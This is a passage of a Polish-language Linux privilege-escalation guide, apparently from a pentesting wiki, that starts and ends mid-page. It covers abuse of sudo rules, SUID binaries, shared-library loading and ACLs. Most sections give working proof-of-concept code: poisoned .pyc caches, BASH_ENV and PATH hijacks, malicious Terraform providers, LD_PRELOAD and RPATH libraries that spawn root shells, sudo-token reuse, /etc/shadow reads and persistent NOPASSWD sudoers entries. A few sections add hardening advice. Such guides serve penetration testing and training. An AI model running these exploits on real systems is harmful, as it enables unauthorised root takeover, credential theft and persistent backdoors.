  - Interpreter weryfikuje **nagłówek** (magic + metadane znacznika czasu/hasza powiązane ze źródłem), a następnie wykonuje obiekt kodu zapisany w formacie marshaled za nagłówkiem.
  - Jeśli możesz **usunąć i ponownie utworzyć** plik cache, ponieważ katalog jest zapisywalny, nadal możesz podmienić plik `.pyc` należący do roota, który nie jest zapisywalny.
- Typowa ścieżka:
  - `sudo -l` pokazuje skrypt Pythona lub wrapper, który możesz uruchomić jako root.
  - Ten skrypt importuje lokalny moduł z `/opt/app/`, `/usr/local/lib/...` itp.
  - Katalog `__pycache__` importowanego modułu jest zapisywalny przez twojego użytkownika lub przez wszystkich.

Szybkie rozpoznanie:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Jeśli możesz przeanalizować skrypt uruchamiany z uprawnieniami, zidentyfikuj importowane moduły i ścieżkę ich pamięci podręcznej:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Przebieg nadużycia:

1. Uruchom raz skrypt dozwolony przez sudo, aby Python utworzył prawidłowy plik cache, jeśli jeszcze nie istnieje.
2. Odczytaj pierwsze 16 bajtów z prawidłowego pliku `.pyc` i użyj ich w zatrutym pliku.
3. Skompiluj obiekt kodu payloadu, wykonaj na nim `marshal.dumps(...)`, usuń oryginalny plik cache i utwórz go ponownie, łącząc oryginalny nagłówek ze złośliwym bytecode’em.
4. Uruchom ponownie skrypt dozwolony przez sudo, aby import wykonał payload jako root.

Ważne uwagi:

- Ponowne użycie oryginalnego nagłówka jest kluczowe, ponieważ Python sprawdza metadane cache względem pliku źródłowego, a nie to, czy treść bytecode’u rzeczywiście odpowiada źródłu.
- Jest to szczególnie przydatne, gdy plik źródłowy należy do roota i nie można go zapisywać, ale można zapisywać w zawierającym go katalogu `__pycache__`.
- `PYTHONDONTWRITEBYTECODE=1` i `python -B` zapobiegają zapisywaniu przez Pythona nowych plików `.pyc`; **nie** uniemożliwiają mu ładowania już istniejącego, prawidłowego cache’u podmienionego przez atakującego. Kluczową granicą jest to, czy użytkownik o niższych uprawnieniach może podmienić cache akceptowany przez uprzywilejowany import. Python sprawdza metadane dotyczące znacznika czasu/rozmiaru lub hash przed załadowaniem zbuforowanego bytecode’u. Zobacz [dokumentację referencyjną importowania w Pythonie](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) i [dokumentację wiersza poleceń](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimalny schemat proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Upewnij się, że żaden katalog w uprzywilejowanej ścieżce importu Pythona nie jest zapisywalny przez użytkowników o niskich uprawnieniach, w tym `__pycache__`.
- Sprawdź właścicieli i uprawnienia katalogów cache, w tym istniejących plików `.pyc`. Wyłączenie zapisu bytecode może ograniczyć tworzenie nowych plików cache, ale nie zabezpiecza przed podmianą istniejącego pliku cache.
- Traktuj zapisywalne lokalne moduły Pythona i zapisywalne katalogi cache tak samo jak zapisywalne skrypty powłoki lub biblioteki współdzielone uruchamiane przez roota.

### BASH_ENV zachowany przez sudo env_keep → powłoka roota

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie startowe Basha w trybie nieinteraktywnym, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.<sup>[[24]](#references)</sup>

- Dlaczego to działa: w przypadku powłok nieinteraktywnych Bash przetwarza `$BASH_ENV` i wykonuje wskazany plik przed uruchomieniem skryptu docelowego. Wiele reguł sudo pozwala uruchamiać skrypt lub wrapper powłoki. Jeśli `BASH_ENV` jest zachowany przez sudo, wskazany przez ciebie plik zostanie wykonany z uprawnieniami roota.<sup>[[23]](#references)</sup>

- Wymagania:
  - Reguła sudo, z której możesz skorzystać (dowolny cel uruchamiający `/bin/bash` w trybie nieinteraktywnym lub dowolny skrypt bash).
  - `BASH_ENV` znajduje się w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Utwardzanie:
  - Usuń `BASH_ENV` (i `ENV`) z `env_keep`, preferuj `env_reset`.
  - Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych plików binarnych.
  - Rozważ logowanie operacji wejścia/wyjścia sudo i alerty, gdy używane są zachowane zmienne środowiskowe.

### Terraform przez sudo z zachowanym HOME (!env_reset)

Gdy sudo zezwala na uruchomienie Terraform jako użytkownik z wyższymi uprawnieniami, `!env_reset` to wskazówka, by sprawdzić, które zmienne środowiskowe faktycznie są zachowywane przez tę konkretną regułę. Zanim uznasz plik `.terraformrc` lub `terraform.rc`, do którego wywołujący ma prawo zapisu, za aktywną konfigurację CLI, potwierdź efektywną wartość `HOME` lub `TF_CLI_CONFIG_FILE`. Wpis `provider_installation.dev_overrides` ma znaczenie tylko wtedy, gdy ustalone polecenie Terraform ładuje tego providera, a wywołujący może umieścić jego plik wykonywalny w wybranym katalogu.<sup>[[25]](#references)</sup>

- Skieruj wymaganego providera do katalogu z prawem zapisu i umieść w nim złośliwą wtyczkę nazwaną na cześć providera (np. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform zakończy się niepowodzeniem podczas uzgadniania protokołu wtyczki Go, ale przed awarią wykona payload jako root, pozostawiając po sobie powłokę SUID.

### Nadpisywanie TF_VAR + obejście walidacji symlinków

Zmienne Terraform można przekazywać za pomocą zmiennych środowiskowych `TF_VAR_<name>`, jeśli konkretna reguła sudo ich nie usuwa. Odczyt przez symlink źródłowy wymaga też providera, który podąża za linkiem i kopiuje chroniony wynik do lokalizacji docelowej, którą wywołujący może odczytać. Zapis przez symlink docelowy wymaga osobno wpisu lokalizacji docelowej kontrolowanego przez wywołującego oraz uprzywilejowanego providera, który podąża za nim podczas zapisu; późniejsze zadanie zaplanowane to tylko jedna z możliwych konsekwencji. Przed testowaniem którejkolwiek z tych dróg sprawdź dokładną regułę sudo, odpowiednie pliki `.tf`, wybraną konfigurację CLI i właściciela ścieżek, używając poleceń tylko do odczytu, takich jak `sudo -l`, `stat` i `readlink`. Słabe walidacje leksykalne, takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, nie rozwiązują symlinków:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform rozwiązuje symlink i kopiuje prawdziwy plik `/root/root.txt` do lokalizacji docelowej, którą może odczytać atakujący. Tego samego podejścia można użyć do **zapisywania** w uprzywilejowanych lokalizacjach, tworząc wcześniej symlinki w lokalizacjach docelowych (np. wskazujące na ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

W niektórych starszych dystrybucjach sudo można skonfigurować za pomocą `requiretty`, co wymusza uruchamianie sudo wyłącznie z interaktywnego TTY. Jeśli ustawiono `!requiretty` (lub tej opcji brakuje), sudo można uruchamiać z kontekstów nieinteraktywnych, takich jak reverse shells, zadania cron lub skrypty.

```bash
Defaults !requiretty
```

Nie jest to bezpośrednia podatność sama w sobie, ale rozszerza zakres sytuacji, w których można nadużyć reguł sudo bez pełnego PTY.

### Sudo env_keep+=PATH / niebezpieczny secure_path → PATH hijack

Jeśli `sudo -l` pokazuje `env_keep+=PATH` lub `secure_path` zawierający wpisy zapisywalne przez atakującego (np. `/home/<user>/bin`), niekwalifikowane polecenie zewnętrzne w dozwolonym przez sudo celu może zostać przesłonięte.<sup>[[3]](#references)</sup> Brak efektywnego `secure_path` również warto sprawdzić, **jeśli** środowisko sudo dla polecenia zachowuje kontrolowaną przez wywołującego zmienną `PATH`; sam brak tej opcji nie dowodzi, że tak jest. Przeczytaj dozwolony skrypt bez uruchamiania go, a następnie zweryfikuj dokładną regułę RunAs i argumentów, efektywną ścieżkę wyszukiwania poleceń oraz wcześniejszy w kolejności katalog, który jest zapisywalny i możliwy do przeszukania, a zarazem zawiera plik o nazwie polecenia. Uwierzytelnianie, `NOEXEC`, wbudowane polecenia powłoki i bezwzględne ścieżki do poleceń mogą zmienić rezultat.

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt/binarkę wywołującą polecenia bez bezwzględnych ścieżek (`free`, `df`, `ps` itd.) oraz zapisywalny wpis PATH wyszukiwany w pierwszej kolejności.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Omijanie ścieżek podczas wykonywania przez Sudo
**Przejdź**, aby odczytać inne pliki lub użyj **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Jeśli używany jest **wildcard** (\*), jest to jeszcze łatwiejsze:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Polecenie Sudo/binarny SUID bez ścieżki polecenia

Jeśli **uprawnienie sudo** przyznano do pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_, możesz to wykorzystać, zmieniając zmienną PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Tej techniki można również użyć, jeśli plik binarny **SUID** **uruchamia inne polecenie bez podania jego ścieżki (zawsze sprawdzaj zawartość dziwnego pliku binarnego SUID za pomocą** _**strings**_**).**

[Przykłady payloadów do uruchomienia.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Plik binarny SUID z określoną ścieżką polecenia

Jeśli plik binarny **SUID** **uruchamia inne polecenie, podając jego ścieżkę**, możesz spróbować **wyeksportować funkcję** o nazwie takiej jak polecenie wywoływane przez plik SUID.

Na przykład, jeśli plik binarny SUID wywołuje _**/usr/sbin/service apache2 start**_, spróbuj utworzyć i wyeksportować funkcję:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Następnie, gdy wywołasz plik binarny SUID, ta funkcja zostanie wykonana

### Niestandardowe wrappery SUID do kopiowania

Narzędzie SUID należące do roota, które przyjmuje ścieżki źródłową i docelową, może przekraczać dwie różne granice zaufania. Jeśli tworzy polecenie powłoki z któregokolwiek argumentu (na przykład przekazuje skonstruowane polecenie `cp` do `system()`), metaznaki powłoki mogą uruchomić inne polecenie z uprawnieniami efektywnymi tego narzędzia. Nawet jeśli wywołuje `cp` bezpiecznie, bez użycia powłoki, nieograniczona ścieżka docelowa może umożliwić dowolny zapis z uprawnieniami roota do plików takich jak `/etc/passwd`. Sprawdź obsługę argumentów przez wrapper, zachowanie efektywnego UID, ograniczenia dotyczące ścieżki docelowej oraz to, czy kopiowany plik zachowuje treść kontrolowaną przez wywołującego; ogólny błąd `cp` lub sam bit SUID nie dowodzą żadnej z tych możliwości. Przed ręcznymi testami pasywnie zinwentaryzuj plik binarny i jego uprawnienia.

### Skrypt z prawem zapisu uruchamiany przez wrapper SUID

Częstą błędną konfiguracją niestandardowej aplikacji jest wrapper będący plikiem binarnym SUID należącym do roota, który uruchamia skrypt, podczas gdy użytkownicy o niskich uprawnieniach mają prawo zapisu do samego skryptu.

Typowy wzorzec:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Jeśli `/usr/local/bin/backup.sh` jest zapisywalny, możesz dopisać polecenia payloadu, a następnie uruchomić wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Szybkie kontrole:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Ta ścieżka ataku jest szczególnie częsta w skryptach opakowujących „maintenance”/„backup” dostarczanych w `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do określania jednej lub kilku bibliotek współdzielonych (plików .so), które loader ma załadować przed wszystkimi pozostałymi, w tym standardową biblioteką C (`libc.so`). Ten proces jest znany jako preładowanie biblioteki.

Aby jednak zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system wymusza pewne warunki:

- Loader ignoruje **LD_PRELOAD** w przypadku plików wykonywalnych, w których rzeczywisty identyfikator użytkownika (_ruid_) nie jest zgodny z efektywnym identyfikatorem użytkownika (_euid_).
- W przypadku plików wykonywalnych z suid/sgid preładowywane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają suid/sgid.

Eskalacja uprawnień może nastąpić, jeśli możesz wykonywać polecenia za pomocą `sudo`, a wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala zachować zmienną środowiskową **LD_PRELOAD** i rozpoznać ją również podczas uruchamiania poleceń za pomocą `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Zapisz jako **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Następnie **skompiluj to** za pomocą:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Na koniec **eskaluj uprawnienia**, uruchamiając

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Plik binarny SUID – .so injection

W przypadku napotkania pliku binarnego z uprawnieniami **SUID**, który wydaje się nietypowy, warto sprawdzić, czy prawidłowo ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje możliwość wykorzystania tej sytuacji.

Aby ją wykorzystać, należy utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do biblioteki współdzielonej (.so) za pomocą:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Na koniec uruchomienie podatnego pliku binarnego SUID powinno uruchomić exploit, potencjalnie umożliwiając przejęcie systemu.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Teraz, gdy znaleźliśmy plik binarny SUID ładujący bibliotekę z folderu, do którego możemy zapisywać, utwórzmy w tym folderze bibliotekę o wymaganej nazwie:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Jeśli pojawi się błąd taki jak

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

to oznacza, że wygenerowana przez Ciebie biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to wyselekcjonowana lista plików binarnych Uniksa, które atakujący może wykorzystać do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to podobna lista dotycząca przypadków, w których można **wstrzykiwać wyłącznie argumenty** do polecenia.

Projekt gromadzi legalne funkcje plików binarnych Uniksa, które można wykorzystać do wydostania się z ograniczonych powłok, eskalacji lub utrzymania podwyższonych uprawnień, przesyłania plików, uruchamiania bind i reverse shells oraz realizacji innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie którejś z reguł sudo.

### Ponowne użycie tokenów Sudo

Jeśli masz **dostęp do sudo**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.<sup>[[18]](#references)</sup>

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- Użytkownik "_sampleuser_" **użył `sudo`** do wykonania jakiegoś polecenia w ciągu **ostatnich 15 minut** (domyślnie tyle wynosi czas ważności tokenu sudo, który pozwala nam używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępne (możesz je przesłać)

(Możesz tymczasowo włączyć `ptrace_scope`, wykonując `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, lub zrobić to na stałe, modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Pierwszy exploit** (`exploit.sh`) utworzy plik binarny `activate_sudo_token` w _/tmp_. Możesz go użyć, aby **aktywować token sudo w swojej sesji** (nie uzyskasz automatycznie powłoki roota — wykonaj `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Drugi exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_, **należącą do roota i z ustawionym bitem setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Trzeci exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **tokeny sudo będą wieczne i wszyscy użytkownicy będą mogli używać sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia zapisu** do folderu lub któregokolwiek z utworzonych w nim plików, możesz użyć pliku binarnego [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell tego użytkownika o PID 1234, możesz **uzyskać uprawnienia sudo** bez znajomości hasła, wykonując:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` określają, kto może używać `sudo` i w jaki sposób. Pliki te **domyślnie mogą być odczytywane wyłącznie przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz **zdobyć interesujące informacje**, a jeśli możesz **zapisywać** dowolny plik, będziesz w stanie **eskalować uprawnienia**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Jeśli masz uprawnienie do zapisu, możesz je nadużyć.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Inny sposób nadużycia tych uprawnień:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Istnieją alternatywy dla binarnego pliku `sudo`, takie jak `doas` w OpenBSD. Pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Jeśli `doas` zezwala na użycie edytora lub interpretera, sprawdź obejścia w stylu GTFOBins:

```bash
doas vim
:!/bin/sh
```

Reguła `doas` umożliwiająca uruchamianie poleceń jako root dla oryginalnego, napisanego w Pythonie narzędzia `dstat` również uzasadnia sprawdzenie ścieżek pluginów. Jego [podręcznik](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) i [kod źródłowy](https://github.com/dstat-real/dstat/blob/master/dstat) wymieniają `/usr/share/dstat/` i `/usr/local/share/dstat/` jako lokalizacje pluginów `dstat_*.py`. Jeśli bieżący użytkownik może zapisywać w lokalizacji używanej przez zainstalowaną wersję i przeszukiwać ją, wybrany plugin może zostać uruchomiony z tożsamością RunAs określoną przez `doas`. Potwierdź efektywną regułę, sposób wyszukiwania pluginów w tej wersji, uprawnienia lub ACL katalogu i jego katalogów nadrzędnych oraz to, czy wywołujący może wybrać plugin; sama reguła `dstat` lub zapisywalny katalog to jedynie wskazówka. Inne implementacje `dstat` mogą korzystać z odmiennych systemów pluginów. Sprawdź metadane pasywnie, nie ładując pluginu.

### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień, a udało Ci się uzyskać powłokę w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny `sudo`**, który uruchomi Twój kod jako root, a następnie wykona polecenie użytkownika. Potem **zmodyfikuj `$PATH`** w kontekście użytkownika (na przykład dodając nową ścieżkę w `.bash_profile`), aby po uruchomieniu przez użytkownika `sudo` wykonywany był Twój plik wykonywalny `sudo`.

Pamiętaj, że jeśli użytkownik korzysta z innej powłoki (nie bash), musisz zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc` i `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchomienie czegoś w rodzaju:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj plik ten zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że zostaną odczytane pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf`. Te pliki konfiguracyjne **wskazują inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość pliku `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie wyszukiwał biblioteki w `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** do którejkolwiek ze wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnego pliku w `/etc/ld.so.conf.d/` lub dowolnego folderu wymienionego w pliku konfiguracyjnym z `/etc/ld.so.conf.d/*.conf`, może być w stanie eskalować uprawnienia.\
Zobacz, **jak wykorzystać tę błędną konfigurację**, na stronie:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Po skopiowaniu lib do `/var/tmp/flag15/` program użyje jej z tej lokalizacji, zgodnie ze zmienną `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities zapewniają procesowi **podzbiór dostępnych uprawnień roota**. W praktyce dzielą **uprawnienia roota na mniejsze, odrębne jednostki**. Każdą z tych jednostek można następnie niezależnie przyznać procesom. W ten sposób ogranicza się pełny zestaw uprawnień, zmniejszając ryzyko wykorzystania luk.\
Przeczytaj poniższą stronę, aby **dowiedzieć się więcej o capabilities i sposobach ich nadużywania**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu **bit „wykonywania”** oznacza, że dany użytkownik może wykonać polecenie „**cd**”, aby przejść do folderu.\
Bit **„odczytu”** oznacza, że użytkownik może **wyświetlać listę** **plików**, a bit **„zapisu”** oznacza, że może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) to dodatkowa warstwa uznaniowych uprawnień, która może **zastąpić tradycyjne uprawnienia ugo/rwx**. Uprawnienia te zapewniają większą kontrolę nad dostępem do plików lub katalogów, umożliwiając przyznawanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Taki poziom **szczegółowości zapewnia precyzyjniejsze zarządzanie dostępem**. Więcej informacji znajdziesz [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Przyznaj** użytkownikowi „kali” uprawnienia do odczytu i zapisu pliku:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pobierz** pliki z określonymi ACL-ami z systemu:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Ukryte tylne wejście ACL w plikach `/etc/sudoers.d/`

Częstą błędną konfiguracją jest należący do roota plik w `/etc/sudoers.d/` z uprawnieniami `440`, który mimo to zapewnia użytkownikowi o niskich uprawnieniach dostęp do zapisu przez ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Jeśli widzisz coś takiego jak `user:alice:rw-`, użytkownik może dopisać regułę sudo pomimo restrykcyjnych bitów uprawnień:

```bash
